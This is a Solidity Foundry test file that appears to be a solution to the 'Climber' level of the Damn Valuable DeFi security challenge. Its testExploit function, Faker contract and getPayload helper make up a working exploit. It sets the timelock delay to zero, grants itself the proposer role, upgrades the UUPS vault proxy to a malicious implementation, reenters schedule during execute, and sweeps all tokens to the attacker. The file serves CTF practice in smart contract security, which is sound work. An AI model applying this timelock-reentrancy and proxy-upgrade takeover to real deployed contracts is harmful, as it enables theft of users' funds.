// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Utilities} from "../../utils/Utilities.sol";
import "openzeppelin-contracts/proxy/ERC1967/ERC1967Proxy.sol";
import "forge-std/Test.sol";

import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
import {ClimberTimelock} from "../../../src/Contracts/climber/ClimberTimelock.sol";
import {ClimberVault} from "../../../src/Contracts/climber/ClimberVault.sol";

import {AccessControl} from "openzeppelin-contracts/access/AccessControl.sol";
import {Initializable} from "openzeppelin-contracts-upgradeable/proxy/utils/Initializable.sol";
import {OwnableUpgradeable} from "openzeppelin-contracts-upgradeable/access/OwnableUpgradeable.sol";
import {UUPSUpgradeable} from "openzeppelin-contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
import {IERC20} from "openzeppelin-contracts/token/ERC20/IERC20.sol";

contract Climber is Test {
    uint256 internal constant VAULT_TOKEN_BALANCE = 10_000_000e18;

    Utilities internal utils;
    DamnValuableToken internal dvt;
    ClimberTimelock internal climberTimelock;
    ClimberVault internal climberImplementation;
    ERC1967Proxy internal climberVaultProxy;
    address[] internal users;
    address payable internal deployer;
    address payable internal proposer;
    address payable internal sweeper;
    address payable internal attacker;

    function setUp() public {
        /**
         * SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE
         */

        utils = new Utilities();
        users = utils.createUsers(3);

        deployer = payable(users[0]);
        proposer = payable(users[1]);
        sweeper = payable(users[2]);

        attacker = payable(address(uint160(uint256(keccak256(abi.encodePacked("attacker"))))));
        vm.label(attacker, "Attacker");
        vm.deal(attacker, 0.1 ether);

        // Deploy the vault behind a proxy using the UUPS pattern,
        // passing the necessary addresses for the `ClimberVault::initialize(address,address,address)` function
        climberImplementation = new ClimberVault();
        vm.label(address(climberImplementation), "climber Implementation");

        bytes memory data = abi.encodeWithSignature("initialize(address,address,address)", deployer, proposer, sweeper);
        climberVaultProxy = new ERC1967Proxy(
            address(climberImplementation),
            data
        );

        assertEq(ClimberVault(address(climberVaultProxy)).getSweeper(), sweeper);

        assertGt(ClimberVault(address(climberVaultProxy)).getLastWithdrawalTimestamp(), 0);

        climberTimelock = ClimberTimelock(payable(ClimberVault(address(climberVaultProxy)).owner()));

        assertTrue(climberTimelock.hasRole(climberTimelock.PROPOSER_ROLE(), proposer));

        assertTrue(climberTimelock.hasRole(climberTimelock.ADMIN_ROLE(), deployer));

        // Deploy token and transfer initial token balance to the vault
        dvt = new DamnValuableToken();
        vm.label(address(dvt), "DVT");
        dvt.transfer(address(climberVaultProxy), VAULT_TOKEN_BALANCE);

        console.log(unicode"🧨 Let's see if you can break it... 🧨");
    }

    function testExploit() public {
        /**
         * EXPLOIT START *
         */
        // we want to update the implementation contract to the malicious contract.
        Faker faker = new Faker();

        (address[] memory targets, uint256[] memory values, bytes[] memory dataElements, bytes32 salt) =
            getPayload(climberTimelock, ClimberVault(address(climberVaultProxy)), dvt, attacker, faker);

        // nothing is scheduled yet but this `execute` method violates the check-effects-interactions pattern.
        // we can reenter the schedule function and register the operation.
        climberTimelock.execute(targets, values, dataElements, salt);
        /**
         * EXPLOIT END *
         */
        validation();
        console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
    }

    function validation() internal {
        /**
         * SUCCESS CONDITIONS
         */
        assertEq(dvt.balanceOf(attacker), VAULT_TOKEN_BALANCE);
        assertEq(dvt.balanceOf(address(climberVaultProxy)), 0);
    }
}

/// @dev This contract have to implement UUPSUpgradeable::proxiableUUID()
contract Faker is UUPSUpgradeable {
    /// @dev Entry point for the exploit
    function sweepAll(address token, address recipient) external {
        IERC20(token).transfer(recipient, IERC20(token).balanceOf(address(this)));
    }

    /// @dev register the operation in the TimeLock contract
    function register(
        ClimberTimelock climberTimelock,
        ClimberVault climberVaultProxy,
        DamnValuableToken dvt,
        address attacker,
        Faker faker
    ) public {
        (address[] memory targets, uint256[] memory values, bytes[] memory dataElements, bytes32 salt) =
            getPayload(climberTimelock, ClimberVault(address(climberVaultProxy)), dvt, attacker, faker);

        ClimberTimelock(climberTimelock).schedule(targets, values, dataElements, salt);
    }

    function _authorizeUpgrade(address newImplementation) internal override {}
}

/// @dev get the payload for the schedule function
function getPayload(
    ClimberTimelock climberTimelock,
    ClimberVault climberVaultProxy,
    DamnValuableToken dvt,
    address attacker,
    Faker faker
) returns (address[] memory targets, uint256[] memory values, bytes[] memory dataElements, bytes32 salt) {
    uint256 length = 4;
    targets = new address[](length);
    values = new uint[](length);
    dataElements = new bytes[](length);

    // update delay to zero. This will allow us to schedule a transaction immediately
    targets[0] = address(climberTimelock);
    dataElements[0] = abi.encodeWithSelector(ClimberTimelock.updateDelay.selector, uint64(0));

    // grant faker the PROPOSER_ROLE to allow it to schedule transactions
    targets[1] = address(climberTimelock);
    dataElements[1] =
        abi.encodeWithSelector(AccessControl.grantRole.selector, climberTimelock.PROPOSER_ROLE(), address(faker));

    // upgrade the vault to the faker contract
    // sweep all tokens to the attacker
    targets[2] = address(climberVaultProxy);
    bytes memory data = abi.encodeWithSelector(Faker.sweepAll.selector, address(dvt), attacker);
    dataElements[2] = abi.encodeWithSelector(UUPSUpgradeable.upgradeToAndCall.selector, address(faker), data);

    // reenter the schedule function and call the schedule function on the TimeLock contract
    targets[3] = address(faker);
    dataElements[3] = abi.encodeWithSelector(
        Faker.register.selector,
        address(climberTimelock),
        address(climberVaultProxy),
        address(dvt),
        attacker,
        address(faker)
    );
}
